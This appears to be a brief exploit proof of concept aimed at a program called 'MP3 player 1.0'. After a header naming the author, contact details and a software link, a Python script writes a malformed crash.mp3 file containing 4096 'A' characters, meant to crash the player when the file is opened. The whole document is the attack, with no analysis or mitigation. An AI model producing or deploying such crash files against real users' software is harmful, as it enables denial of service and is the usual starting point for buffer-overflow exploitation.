#!/usr/bin/env python
#MP3 player 1.0 Local Crash
#Author: l3D
#Software Link: http://files.brothersoft.com/mp3_audio/players/td-mp3.exe
#Site: http://xraysecurity.blogspot.com
#IRC: irc://irc.nix.co.il
#Email: pupipup33@gmail.com
 
bad=open('crash.mp3', 'w')
bad.write('A'*0x1000)
bad.close()
